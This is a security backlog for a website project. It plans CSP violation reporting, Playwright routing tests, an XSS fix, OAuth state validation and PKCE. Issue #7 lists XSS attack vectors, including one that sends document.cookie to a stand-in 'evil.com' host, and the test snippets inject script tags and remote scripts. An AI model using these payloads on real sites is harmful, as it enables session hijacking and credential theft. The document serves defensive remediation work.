# Security & Infrastructure Backlog

This document tracks HIGH priority security and infrastructure improvements identified during enterprise code review (2026-02-04).

---

## Issue #4: CSP Violation Reporting

**GitHub:** https://github.com/integritystudio/IntegrityLandingPage/issues/4
**Severity:** HIGH
**Category:** Security / Observability
**Effort:** Medium (2-4 hours)

### Problem Statement

The Content Security Policy (CSP) in `web/index.html:23-35` has no `report-uri` or `report-to` directive. This means:

- CSP violations are invisible (blocked resources, XSS attempts)
- No alerting on potential attacks
- Cannot debug legitimate resources being blocked
- No data to inform CSP policy refinement

### Current CSP (web/index.html:23-35)

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'wasm-unsafe-eval' https://www.googletagmanager.com ...;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  ...
  upgrade-insecure-requests;
">
```

### Implementation Options

#### Option A: Sentry CSP Reporting (Recommended)

Sentry already handles error tracking for this project. CSP reporting is a built-in feature.

**Pros:**
- Already integrated (Sentry DSN configured)
- Unified security dashboard
- Alert rules already configured
- No additional infrastructure

**Cons:**
- Sentry CSP reports count against event quota
- Limited CSP-specific analytics

**Implementation:**

1. **Get Sentry CSP endpoint:**
   ```
   https://sentry.io/api/<PROJECT_ID>/security/?sentry_key=<PUBLIC_KEY>
   ```

2. **Update CSP in `web/index.html`:**
   ```html
   <meta http-equiv="Content-Security-Policy" content="
     default-src 'self';
     script-src 'self' 'wasm-unsafe-eval' https://www.googletagmanager.com https://connect.facebook.net https://www.google-analytics.com https://www.gstatic.com https://static.cloudflareinsights.com;
     style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
     img-src 'self' data: blob: https://www.facebook.com https://connect.facebook.net https://www.google-analytics.com https://www.googletagmanager.com https://*.google.com https://*.google.com.mx https://*.doubleclick.net;
     font-src 'self' https://fonts.gstatic.com;
     connect-src 'self' https://www.google-analytics.com https://region1.google-analytics.com https://analytics.google.com https://*.doubleclick.net https://www.facebook.com https://connect.facebook.net https://integrity-studio-contact.alyshia-b38.workers.dev https://www.gstatic.com https://fonts.gstatic.com https://sentry.io;
     frame-src 'self' https://calendly.com https://td.doubleclick.net;
     object-src 'none';
     base-uri 'self';
     form-action 'self';
     upgrade-insecure-requests;
     report-uri https://sentry.io/api/PROJECT_ID/security/?sentry_key=PUBLIC_KEY;
   ">
   ```

3. **Configure Sentry alert:**
   - Navigate to Sentry > Alerts > Create Alert
   - Event Type: CSP Report
   - Condition: First occurrence OR > 10 events/hour
   - Action: Email + Slack notification

#### Option B: Cloudflare Worker CSP Collector

Create a dedicated Cloudflare Worker to collect and store CSP reports.

**Pros:**
- Full control over data
- No external dependencies
- Custom analytics
- No event quotas

**Cons:**
- Additional infrastructure to maintain
- Must build alerting integration
- Storage costs (KV/D1)

**Implementation:**

1. **Create CSP collector worker:**

   ```typescript
   // workers/csp-report/src/index.ts
   interface Env {
     CSP_REPORTS: KVNamespace;
     SLACK_WEBHOOK_URL?: string;
   }

   interface CSPReport {
     'csp-report': {
       'document-uri': string;
       'violated-directive': string;
       'blocked-uri': string;
       'source-file'?: string;
       'line-number'?: number;
       'column-number'?: number;
       'original-policy': string;
     };
   }

   export default {
     async fetch(request: Request, env: Env): Promise<Response> {
       if (request.method !== 'POST') {
         return new Response('Method not allowed', { status: 405 });
       }

       try {
         const report: CSPReport = await request.json();
         const cspReport = report['csp-report'];

         // Store report
         const key = `csp:${Date.now()}:${crypto.randomUUID()}`;
         await env.CSP_REPORTS.put(key, JSON.stringify({
           ...cspReport,
           timestamp: new Date().toISOString(),
           userAgent: request.headers.get('User-Agent'),
         }), { expirationTtl: 60 * 60 * 24 * 30 }); // 30 days

         // Alert on suspicious patterns
         if (shouldAlert(cspReport)) {
           await sendSlackAlert(env, cspReport);
         }

         return new Response('', { status: 204 });
       } catch (error) {
         console.error('CSP report error:', error);
         return new Response('', { status: 204 }); // Don't leak errors
       }
     },
   };

   function shouldAlert(report: CSPReport['csp-report']): boolean {
     const suspicious = [
       'script-src',
       'object-src',
       'base-uri',
     ];
     return suspicious.some(d => report['violated-directive'].startsWith(d));
   }

   async function sendSlackAlert(env: Env, report: CSPReport['csp-report']): Promise<void> {
     if (!env.SLACK_WEBHOOK_URL) return;

     await fetch(env.SLACK_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         text: `CSP Violation Alert`,
         blocks: [{
           type: 'section',
           text: {
             type: 'mrkdwn',
             text: `*CSP Violation*\n• Directive: \`${report['violated-directive']}\`\n• Blocked: \`${report['blocked-uri']}\`\n• Page: ${report['document-uri']}`,
           },
         }],
       }),
     });
   }
   ```

2. **Deploy worker:**
   ```bash
   cd workers/csp-report
   wrangler deploy
   ```

3. **Update CSP:**
   ```html
   report-uri https://csp-report.integritystudio.workers.dev;
   ```

#### Option C: Report-To Header (Modern Browsers)

Use the newer Reporting API for more detailed reports.

**Implementation:**

1. **Add Report-To header via Cloudflare Worker or _headers file:**

   ```
   # web/_headers
   /*
     Report-To: {"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"https://sentry.io/api/PROJECT_ID/security/?sentry_key=PUBLIC_KEY"}]}
   ```

2. **Update CSP:**
   ```html
   report-to csp-endpoint;
   ```

### Recommended Approach

**Phase 1:** Implement Option A (Sentry) immediately - minimal effort, integrated alerting.

**Phase 2:** If CSP report volume is high or more analytics needed, implement Option B.

### Acceptance Criteria

- [ ] CSP violations are logged to a monitoring system
- [ ] Alerts fire on suspicious violations (script-src, object-src)
- [ ] Dashboard shows CSP violation trends
- [ ] Documentation updated with CSP monitoring procedures

### Testing

1. **Trigger test violation:**
   ```javascript
   // Browser console on integritystudio.ai
   const script = document.createElement('script');
   script.src = 'https://evil.example.com/malicious.js';
   document.head.appendChild(script);
   ```

2. **Verify report received in Sentry/Worker**

3. **Verify alert fires for script-src violation**

---

## Issue #6: E2E Tests for Blog Routing and Redirects

**GitHub:** https://github.com/integritystudio/IntegrityLandingPage/issues/6
**Severity:** HIGH
**Category:** Testing / Reliability
**Effort:** Medium-High (4-8 hours)

### Problem Statement

The `web/_redirects` file contains routing rules that are critical for:
- Blog listing page (`/blog` → Flutter SPA)
- Blog article pages (`/blog/*.html` → static files)
- Static assets (icons, images)
- SPA fallback for all Flutter routes

These rules have **no automated test coverage**. Changes to redirect rules or Cloudflare Pages behavior could silently break routing.

### Current Redirect Rules (web/_redirects)

```
# Blog listing page - serve SPA (Flutter handles /blog route)
/blog  /index.html  200

# Blog article HTML files - serve directly
/blog/*.html  /blog/:splat.html  200
/blog/*/*.html  /blog/:splat  200

# SPA fallback - serve index.html for app routes only
/*  /index.html  200
```

### Implementation Plan

#### Phase 1: Local Smoke Tests (CI)

Add basic curl-based tests that run against deployed preview URLs.

**File:** `.github/workflows/ci.yml` (add after deploy step)

```yaml
  e2e-routing:
    name: E2E Routing Tests
    runs-on: ubuntu-latest
    needs: deploy-cloudflare
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'

    steps:
      - name: Wait for deployment propagation
        run: sleep 30

      - name: Test routing rules
        run: |
          BASE_URL="https://integritystudio.ai"
          FAILURES=0

          test_route() {
            local path="$1"
            local expected_status="$2"
            local expected_content="$3"
            local description="$4"

            echo -n "Testing $description ($path)... "

            RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL$path")
            STATUS=$(echo "$RESPONSE" | tail -n1)
            BODY=$(echo "$RESPONSE" | sed '$d')

            if [ "$STATUS" != "$expected_status" ]; then
              echo "FAIL (status: $STATUS, expected: $expected_status)"
              FAILURES=$((FAILURES + 1))
              return 1
            fi

            if [ -n "$expected_content" ] && ! echo "$BODY" | grep -q "$expected_content"; then
              echo "FAIL (content mismatch)"
              FAILURES=$((FAILURES + 1))
              return 1
            fi

            echo "OK"
            return 0
          }

          # SPA routes - should return index.html with Flutter bootstrap
          test_route "/" "200" "flutter_bootstrap.js" "Homepage"
          test_route "/blog" "200" "flutter_bootstrap.js" "Blog listing (SPA)"
          test_route "/pricing" "200" "flutter_bootstrap.js" "Pricing page (SPA)"
          test_route "/contact" "200" "flutter_bootstrap.js" "Contact page (SPA)"
          test_route "/about" "200" "flutter_bootstrap.js" "About page (SPA)"

          # Static assets - should return actual files
          test_route "/manifest.json" "200" "name" "Manifest file"
          test_route "/robots.txt" "200" "User-agent" "Robots.txt"
          test_route "/icons/favicon-32x32.png" "200" "" "Favicon"

          # JS files with SRI
          test_route "/js/meta-pixel.js" "200" "fbq" "Meta Pixel JS"
          test_route "/js/gtm-init.js" "200" "dataLayer" "GTM Init JS"

          if [ $FAILURES -gt 0 ]; then
            echo ""
            echo "::error::$FAILURES routing test(s) failed"
            exit 1
          fi

          echo ""
          echo "All routing tests passed"
```

#### Phase 2: Playwright E2E Tests

For comprehensive browser-based testing including JavaScript execution.

**Directory Structure:**
```
e2e/
├── playwright.config.ts
├── package.json
├── tests/
│   ├── routing.spec.ts
│   ├── blog.spec.ts
│   └── spa-navigation.spec.ts
└── .gitignore
```

**File:** `e2e/package.json`

```json
{
  "name": "integritystudio-e2e",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "test": "playwright test",
    "test:ui": "playwright test --ui",
    "test:debug": "playwright test --debug"
  },
  "devDependencies": {
    "@playwright/test": "^1.41.0"
  }
}
```

**File:** `e2e/playwright.config.ts`

```typescript
import { defineConfig, devices } from '@playwright/test';

const BASE_URL = process.env.BASE_URL || 'https://integritystudio.ai';

export default defineConfig({
  testDir: './tests',
  fullyParallel: true,
  forbidOnly: !!process.env.CI,
  retries: process.env.CI ? 2 : 0,
  workers: process.env.CI ? 1 : undefined,
  reporter: 'html',

  use: {
    baseURL: BASE_URL,
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
  },

  projects: [
    {
      name: 'chromium',
      use: { ...devices['Desktop Chrome'] },
    },
    {
      name: 'firefox',
      use: { ...devices['Desktop Firefox'] },
    },
    {
      name: 'webkit',
      use: { ...devices['Desktop Safari'] },
    },
    {
      name: 'mobile-chrome',
      use: { ...devices['Pixel 5'] },
    },
  ],
});
```

**File:** `e2e/tests/routing.spec.ts`

```typescript
import { test, expect } from '@playwright/test';

test.describe('Routing and Redirects', () => {
  test.describe('SPA Routes', () => {
    const spaRoutes = [
      { path: '/', name: 'Homepage' },
      { path: '/blog', name: 'Blog listing' },
      { path: '/pricing', name: 'Pricing' },
      { path: '/contact', name: 'Contact' },
      { path: '/about', name: 'About' },
      { path: '/features', name: 'Features' },
      { path: '/demo', name: 'Demo' },
      { path: '/eu-ai-act', name: 'EU AI Act' },
      { path: '/compliance', name: 'Compliance' },
      { path: '/security', name: 'Security' },
    ];

    for (const route of spaRoutes) {
      test(`${route.name} (${route.path}) loads Flutter app`, async ({ page }) => {
        const response = await page.goto(route.path);

        // Should return 200
        expect(response?.status()).toBe(200);

        // Should contain Flutter bootstrap
        const content = await page.content();
        expect(content).toContain('flutter_bootstrap.js');

        // Flutter should initialize (wait for loading to disappear)
        await expect(page.locator('.loading-container')).toBeHidden({ timeout: 15000 });
      });
    }
  });

  test.describe('Static Assets', () => {
    test('manifest.json is accessible', async ({ request }) => {
      const response = await request.get('/manifest.json');
      expect(response.status()).toBe(200);

      const json = await response.json();
      expect(json.name).toBeDefined();
    });

    test('robots.txt is accessible', async ({ request }) => {
      const response = await request.get('/robots.txt');
      expect(response.status()).toBe(200);

      const text = await response.text();
      expect(text).toContain('User-agent');
    });

    test('favicon is accessible', async ({ request }) => {
      const response = await request.get('/icons/favicon-32x32.png');
      expect(response.status()).toBe(200);
      expect(response.headers()['content-type']).toContain('image/png');
    });

    test('JS files are accessible with correct content', async ({ request }) => {
      const metaPixel = await request.get('/js/meta-pixel.js');
      expect(metaPixel.status()).toBe(200);
      expect(await metaPixel.text()).toContain('fbq');

      const gtmInit = await request.get('/js/gtm-init.js');
      expect(gtmInit.status()).toBe(200);
      expect(await gtmInit.text()).toContain('dataLayer');
    });
  });

  test.describe('Blog Routing', () => {
    test('/blog serves Flutter SPA', async ({ page }) => {
      await page.goto('/blog');

      const content = await page.content();
      expect(content).toContain('flutter_bootstrap.js');

      // Wait for Flutter to load
      await expect(page.locator('.loading-container')).toBeHidden({ timeout: 15000 });
    });

    // TODO: Add tests for /blog/*.html when blog articles exist
    // test('/blog/article.html serves static HTML', async ({ request }) => {
    //   const response = await request.get('/blog/test-article.html');
    //   expect(response.status()).toBe(200);
    //   expect(await response.text()).not.toContain('flutter_bootstrap.js');
    // });
  });

  test.describe('404 Handling', () => {
    test('Unknown routes serve SPA (soft 404)', async ({ page }) => {
      // Cloudflare serves 200 with SPA, Flutter handles 404 display
      const response = await page.goto('/nonexistent-route-12345');
      expect(response?.status()).toBe(200);

      const content = await page.content();
      expect(content).toContain('flutter_bootstrap.js');
    });
  });
});
```

**File:** `e2e/tests/spa-navigation.spec.ts`

```typescript
import { test, expect } from '@playwright/test';

test.describe('SPA Navigation', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    // Wait for Flutter to fully load
    await expect(page.locator('.loading-container')).toBeHidden({ timeout: 15000 });
  });

  test('navigates between pages without full reload', async ({ page }) => {
    // Get initial Flutter state indicator
    const initialUrl = page.url();

    // Click navigation link (adjust selector based on actual nav)
    await page.click('text=Pricing');

    // URL should change
    await expect(page).toHaveURL(/\/pricing/);

    // Page should not show loading spinner (no full reload)
    await expect(page.locator('.loading-container')).toBeHidden();
  });

  test('direct navigation to /contact loads correctly', async ({ page }) => {
    await page.goto('/contact');

    await expect(page.locator('.loading-container')).toBeHidden({ timeout: 15000 });

    // Should show contact form (adjust selector)
    await expect(page.locator('form')).toBeVisible({ timeout: 5000 });
  });

  test('browser back/forward works', async ({ page }) => {
    await page.click('text=Pricing');
    await expect(page).toHaveURL(/\/pricing/);

    await page.goBack();
    await expect(page).toHaveURL(/\/$/);

    await page.goForward();
    await expect(page).toHaveURL(/\/pricing/);
  });
});
```

#### Phase 3: CI Integration

**File:** `.github/workflows/e2e.yml`

```yaml
name: E2E Tests

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    # Run daily at 6 AM UTC to catch regressions
    - cron: '0 6 * * *'

jobs:
  e2e:
    name: Playwright E2E
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        working-directory: e2e
        run: npm ci

      - name: Install Playwright browsers
        working-directory: e2e
        run: npx playwright install --with-deps

      - name: Run E2E tests
        working-directory: e2e
        run: npm test
        env:
          BASE_URL: https://integritystudio.ai

      - name: Upload test results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: playwright-report
          path: e2e/playwright-report/
          retention-days: 30

      - name: Upload screenshots
        uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: screenshots
          path: e2e/test-results/
          retention-days: 7
```

### Acceptance Criteria

- [ ] CI runs routing smoke tests after every deployment
- [ ] Playwright tests cover all SPA routes
- [ ] Playwright tests verify static asset accessibility
- [ ] Blog routing tested (listing + articles when available)
- [ ] Tests run on multiple browsers (Chrome, Firefox, Safari)
- [ ] Test failures produce screenshots for debugging
- [ ] Daily scheduled runs catch infrastructure regressions

### Testing the Tests

```bash
# Local development
cd e2e
npm install
npx playwright install
BASE_URL=https://integritystudio.ai npm test

# With UI for debugging
npm run test:ui

# Against local Flutter server
BASE_URL=http://localhost:8080 npm test
```

---

## Priority Matrix

All HIGH priority issues have been completed. LOW priority enhancements completed 2026-02-06.

| Issue | Severity | Status | Commit |
|-------|----------|--------|--------|
| #4 CSP Reporting | HIGH | **COMPLETED** | 1604013, d85e181, 1a0e6cf |
| #6 E2E Routing | HIGH | **COMPLETED** | ffb5718, d85e181, b1285d1, e2bf55f |

## Related Completed Issues

- [x] #1: Add SRI to external scripts (94c6c3e)
- [x] #2: CSP hash CI validation (94c6c3e)
- [x] #3: Rate limiting graceful degradation (94c6c3e)
- [x] #4: CSP violation reporting to Sentry (1604013)
- [x] #5: Resend API timeout (94c6c3e)
- [x] #6: E2E routing and SPA navigation tests (ffb5718, d85e181)

## Pending Enhancement Recommendations

From enterprise code review (2026-02-04):

### CSP Improvements (LOW priority) - **COMPLETED**
- [x] Add modern `report-to` directive alongside `report-uri` for enhanced reporting (1a0e6cf)
- [ ] Consider multi-environment CSP endpoints (staging vs production)
- [x] Add `frame-ancestors 'self'` directive for clickjacking protection (already present)

### E2E Test Improvements (LOW priority) - **COMPLETED**
- [x] Add CI workflow integration for E2E tests (b1285d1)
- [x] Add cache header validation tests (e2bf55f)
- [x] Add mobile viewport tests (e2bf55f)
- [x] Add accessibility (a11y) tests (e2bf55f)

---

## Issue #7: XSS Vulnerability in OAuth Callback Page

**Severity:** CRITICAL
**Category:** Security
**Effort:** Low (1-2 hours)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

The OAuth callback page (`lib/pages/oauth_callback_page.dart:189-191, 231-239`) displays unsanitized query parameters directly in the UI, enabling XSS attacks.

**Attack Vector:**
```
/oauth/callback?error=<script>alert(document.cookie)</script>
/oauth/callback?error_description=<img src=x onerror='fetch("https://evil.com?c="+document.cookie)'>
```

**Impact:** Arbitrary JavaScript execution, session hijacking, credential theft

### Vulnerable Code (lib/pages/oauth_callback_page.dart:189-191)

```dart
final errorMessage = errorDescription ??
    'An error occurred during authentication. Please try again.';

// Later displayed directly:
Text(errorMessage, ...)  // Line 231
Text('Error code: $error', ...)  // Line 238
```

### Implementation

1. **Create security utility (lib/utils/security_utils.dart):**

```dart
/// Security utilities for input sanitization
class SecurityUtils {
  /// Maximum length for error messages to prevent DoS
  static const int maxErrorLength = 200;

  /// Sanitizes user input to prevent XSS attacks
  ///
  /// Escapes HTML special characters and truncates to maxLength.
  static String sanitizeUserInput(String? input, {int? maxLength}) {
    if (input == null) return '';

    final sanitized = input
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#x27;')
        .replaceAll('/', '&#x2F;');

    final limit = maxLength ?? maxErrorLength;
    return sanitized.length > limit
        ? '${sanitized.substring(0, limit)}...'
        : sanitized;
  }

  /// Validates that a string contains only safe characters for display
  static bool isSafeForDisplay(String? input) {
    if (input == null) return true;
    return !RegExp(r'[<>"\x27/]').hasMatch(input);
  }
}
```

2. **Update OAuth callback page (lib/pages/oauth_callback_page.dart):**

```dart
import '../utils/security_utils.dart';

// In _buildErrorState method (~line 185):
Widget _buildErrorState(BuildContext context, bool isMobile, {String? customError}) {
  final error = widget.error;
  final errorDescription = widget.errorDescription;

  // Sanitize all external input
  final sanitizedError = error != null
      ? SecurityUtils.sanitizeUserInput(error, maxLength: 100)
      : null;
  final sanitizedDescription = errorDescription != null
      ? SecurityUtils.sanitizeUserInput(errorDescription)
      : null;

  final errorMessage = customError ?? sanitizedDescription ??
      'An error occurred during authentication. Please try again.';

  // ... rest of method, use sanitizedError and errorMessage
}
```

### Test Coverage Required (test/pages/oauth_callback_page_test.dart)

```dart
group('security', () {
  testWidgets('sanitizes XSS in error parameter', (tester) async {
    await pumpOAuthCallbackPage(
      tester,
      error: '<script>alert("xss")</script>',
    );

    // Should not contain raw script tags
    expect(find.textContaining('<script>'), findsNothing);
    // Should show sanitized version
    expect(find.textContaining('&lt;script&gt;'), findsOneWidget);
  });

  testWidgets('sanitizes XSS in error_description parameter', (tester) async {
    await pumpOAuthCallbackPage(
      tester,
      errorDescription: '<img src=x onerror="alert(1)">',
    );

    expect(find.textContaining('<img'), findsNothing);
  });

  testWidgets('truncates excessively long error messages', (tester) async {
    final longError = 'A' * 500;
    await pumpOAuthCallbackPage(tester, error: longError);

    // Verify truncation occurred
    final textFinder = find.byType(Text);
    final texts = tester.widgetList<Text>(textFinder);
    expect(texts.any((t) => t.data?.length == 500), isFalse);
  });
});
```

### Acceptance Criteria

- [ ] SecurityUtils class created with sanitizeUserInput method
- [ ] All query parameters sanitized before display
- [ ] Error messages truncated to prevent DoS
- [ ] Unit tests for SecurityUtils (100% coverage)
- [ ] Integration tests for XSS prevention
- [ ] Code review verifies no other unsanitized external input

---

## Issue #8: Missing OAuth State Parameter Validation

**Severity:** CRITICAL
**Category:** Security
**Effort:** Medium (2-4 hours)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

The OAuth callback page (`lib/pages/oauth_callback_page.dart:18, 98-99`) accepts a `state` parameter but never validates it against a stored value, enabling CSRF attacks.

**Attack Vector:**
1. Attacker initiates OAuth flow, captures their `state` and `code`
2. Victim clicks attacker's crafted link with attacker's `state` and `code`
3. Victim's session is linked to attacker's OAuth account
4. Attacker gains access to victim's data

### Current Code (lib/pages/oauth_callback_page.dart:18)

```dart
final String? state;  // Accepted but NEVER validated

// Only checked for presence, not validated against stored value:
final hasCode = code != null;
```

### Implementation

1. **Create OAuth state service (lib/services/oauth_state_service.dart):**

```dart
import 'dart:convert';
import 'dart:math';
import 'package:shared_preferences/shared_preferences.dart';

/// Service for managing OAuth state tokens (CSRF protection)
class OAuthStateService {
  static const String _stateKey = 'oauth_state';
  static const String _timestampKey = 'oauth_state_timestamp';
  static const Duration _stateExpiry = Duration(minutes: 10);

  /// Generates a cryptographically secure state token and stores it
  static Future<String> generateState() async {
    final random = Random.secure();
    final bytes = List<int>.generate(32, (_) => random.nextInt(256));
    final state = base64Url.encode(bytes);

    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_stateKey, state);
    await prefs.setInt(_timestampKey, DateTime.now().millisecondsSinceEpoch);

    return state;
  }

  /// Validates state token (one-time use, expires after 10 minutes)
  static Future<bool> validateState(String? state) async {
    if (state == null) return false;

    final prefs = await SharedPreferences.getInstance();
    final storedState = prefs.getString(_stateKey);
    final timestamp = prefs.getInt(_timestampKey);

    // Clear state immediately (one-time use)
    await prefs.remove(_stateKey);
    await prefs.remove(_timestampKey);

    if (storedState == null || storedState != state) {
      return false;
    }

    if (timestamp == null) return false;

    final age = DateTime.now().millisecondsSinceEpoch - timestamp;
    if (age > _stateExpiry.inMilliseconds) {
      return false; // Expired
    }

    return true;
  }

  /// Clears any pending state (cleanup)
  static Future<void> clearState() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(_stateKey);
    await prefs.remove(_timestampKey);
  }
}
```

2. **Update OAuth callback page (lib/pages/oauth_callback_page.dart):**

```dart
import '../services/oauth_state_service.dart';

class _OAuthCallbackPageState extends State<OAuthCallbackPage> {
  bool _isValidating = true;
  bool _stateValid = false;
  String? _validationError;

  @override
  void initState() {
    super.initState();
    AnalyticsService.trackPageView('oauth_callback');
    _validateOAuthCallback();
  }

  Future<void> _validateOAuthCallback() async {
    if (widget.code != null) {
      // Validate state before accepting the code
      final isValid = await OAuthStateService.validateState(widget.state);

      if (!isValid) {
        setState(() {
          _isValidating = false;
          _validationError = 'Invalid authentication session. Please try again.';
        });

        // Log security event
        AnalyticsService.trackEvent('oauth_state_validation_failed', {
          'has_state': widget.state != null,
        });
        return;
      }

      setState(() {
        _isValidating = false;
        _stateValid = true;
      });
    } else {
      setState(() => _isValidating = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    // Show loading while validating
    if (_isValidating) {
      return _buildProcessingState(context, isMobile);
    }

    // Show error if state validation failed
    if (_validationError != null) {
      return _buildErrorState(context, isMobile, customError: _validationError);
    }

    // ... rest of build method
  }
}
```

3. **Update OAuth initiation (wherever OAuth flow starts):**

```dart
Future<void> initiateGoogleOAuth() async {
  final state = await OAuthStateService.generateState();

  final authUrl = Uri.https('accounts.google.com', '/o/oauth2/v2/auth', {
    'client_id': _clientId,
    'redirect_uri': _redirectUri,
    'response_type': 'code',
    'scope': 'email profile',
    'state': state,  // Include generated state
  });

  await launchUrl(authUrl);
}
```

### Test Coverage Required

```dart
group('OAuth state validation', () {
  testWidgets('rejects callback with missing state', (tester) async {
    await pumpOAuthCallbackPage(tester, code: 'valid_code', state: null);
    await tester.pumpAndSettle();

    expect(find.text('Invalid authentication session'), findsOneWidget);
  });

  testWidgets('rejects callback with invalid state', (tester) async {
    // Generate a state but provide a different one
    await OAuthStateService.generateState();

    await pumpOAuthCallbackPage(tester, code: 'valid_code', state: 'wrong_state');
    await tester.pumpAndSettle();

    expect(find.text('Invalid authentication session'), findsOneWidget);
  });

  testWidgets('accepts callback with valid state', (tester) async {
    final state = await OAuthStateService.generateState();

    await pumpOAuthCallbackPage(tester, code: 'valid_code', state: state);
    await tester.pumpAndSettle();

    expect(find.text('Invalid authentication session'), findsNothing);
  });

  testWidgets('state token is single-use', (tester) async {
    final state = await OAuthStateService.generateState();

    // First validation succeeds
    expect(await OAuthStateService.validateState(state), isTrue);

    // Second validation fails (token consumed)
    expect(await OAuthStateService.validateState(state), isFalse);
  });
});
```

### Acceptance Criteria

- [ ] OAuthStateService created with generateState/validateState methods
- [ ] State tokens are cryptographically secure (32 bytes)
- [ ] State tokens expire after 10 minutes
- [ ] State tokens are single-use (consumed on validation)
- [ ] OAuth callback validates state before accepting code
- [ ] Invalid state shows user-friendly error message
- [ ] Security event logged on state validation failure
- [ ] Unit tests for OAuthStateService
- [ ] Integration tests for state validation flow

---

## Issue #9: Missing PKCE Implementation

**Severity:** CRITICAL
**Category:** Security
**Effort:** Medium (3-4 hours)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

For public OAuth clients (SPAs, mobile apps), RFC 7636 requires PKCE (Proof Key for Code Exchange) to prevent authorization code interception attacks. The current implementation has no PKCE support.

**Attack Vector:**
1. Attacker intercepts authorization code (via malicious app, network sniffing)
2. Attacker exchanges intercepted code for tokens
3. Attacker gains access to victim's account

### Implementation

1. **Add crypto dependency (pubspec.yaml):**

```yaml
dependencies:
  crypto: ^3.0.3
```

2. **Extend OAuth state service (lib/services/oauth_state_service.dart):**

```dart
import 'dart:convert';
import 'dart:math';
import 'package:crypto/crypto.dart';
import 'package:shared_preferences/shared_preferences.dart';

class OAuthStateService {
  static const String _stateKey = 'oauth_state';
  static const String _timestampKey = 'oauth_state_timestamp';
  static const String _verifierKey = 'oauth_code_verifier';
  static const Duration _stateExpiry = Duration(minutes: 10);

  /// Generates state token and PKCE code verifier/challenge
  /// Returns (state, codeChallenge) tuple for OAuth request
  static Future<({String state, String codeChallenge})> generateStateAndPKCE() async {
    final random = Random.secure();

    // Generate state token
    final stateBytes = List<int>.generate(32, (_) => random.nextInt(256));
    final state = base64Url.encode(stateBytes);

    // Generate code verifier (43-128 chars, URL-safe)
    final verifierBytes = List<int>.generate(32, (_) => random.nextInt(256));
    final codeVerifier = base64Url.encode(verifierBytes).replaceAll('=', '');

    // Generate code challenge (SHA256 hash of verifier)
    final challengeBytes = sha256.convert(utf8.encode(codeVerifier)).bytes;
    final codeChallenge = base64Url.encode(challengeBytes).replaceAll('=', '');

    // Store state and verifier
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_stateKey, state);
    await prefs.setString(_verifierKey, codeVerifier);
    await prefs.setInt(_timestampKey, DateTime.now().millisecondsSinceEpoch);

    return (state: state, codeChallenge: codeChallenge);
  }

  /// Retrieves code verifier for token exchange (clears after retrieval)
  static Future<String?> consumeCodeVerifier() async {
    final prefs = await SharedPreferences.getInstance();
    final verifier = prefs.getString(_verifierKey);
    await prefs.remove(_verifierKey);
    return verifier;
  }

  // ... existing validateState method
}
```

3. **Update OAuth initiation:**

```dart
Future<void> initiateGoogleOAuth() async {
  final pkce = await OAuthStateService.generateStateAndPKCE();

  final authUrl = Uri.https('accounts.google.com', '/o/oauth2/v2/auth', {
    'client_id': _clientId,
    'redirect_uri': _redirectUri,
    'response_type': 'code',
    'scope': 'email profile',
    'state': pkce.state,
    'code_challenge': pkce.codeChallenge,
    'code_challenge_method': 'S256',
  });

  await launchUrl(authUrl);
}
```

4. **Update token exchange (backend or client):**

```dart
Future<TokenResponse> exchangeCodeForTokens(String code) async {
  final codeVerifier = await OAuthStateService.consumeCodeVerifier();

  if (codeVerifier == null) {
    throw OAuthException('Missing code verifier');
  }

  final response = await http.post(
    Uri.parse('https://oauth2.googleapis.com/token'),
    body: {
      'client_id': _clientId,
      'code': code,
      'code_verifier': codeVerifier,  // PKCE verification
      'grant_type': 'authorization_code',
      'redirect_uri': _redirectUri,
    },
  );

  // ... handle response
}
```

### Test Coverage Required

```dart
group('PKCE', () {
  test('generates valid code verifier and challenge', () async {
    final pkce = await OAuthStateService.generateStateAndPKCE();

    // Verifier should be 43+ chars
    final prefs = await SharedPreferences.getInstance();
    final verifier = prefs.getString('oauth_code_verifier');
    expect(verifier!.length, greaterThanOrEqualTo(43));

    // Challenge should be base64url encoded
    expect(pkce.codeChallenge, matches(RegExp(r'^[A-Za-z0-9_-]+$')));
  });

  test('code verifier is single-use', () async {
    await OAuthStateService.generateStateAndPKCE();

    final first = await OAuthStateService.consumeCodeVerifier();
    final second = await OAuthStateService.consumeCodeVerifier();

    expect(first, isNotNull);
    expect(second, isNull);
  });

  test('challenge matches verifier via S256', () async {
    final pkce = await OAuthStateService.generateStateAndPKCE();
    final verifier = (await SharedPreferences.getInstance()).getString('oauth_code_verifier')!;

    // Manually compute challenge
    final expectedChallenge = base64Url
        .encode(sha256.convert(utf8.encode(verifier)).bytes)
        .replaceAll('=', '');

    expect(pkce.codeChallenge, equals(expectedChallenge));
  });
});
```

### Acceptance Criteria

- [ ] Code verifier generated (43-128 URL-safe chars)
- [ ] Code challenge computed via SHA256 (S256 method)
- [ ] PKCE params included in authorization request
- [ ] Code verifier sent during token exchange
- [ ] Code verifier is single-use
- [ ] Backend validates code verifier (if applicable)
- [ ] Unit tests for PKCE generation
- [ ] Integration tests for full PKCE flow

---

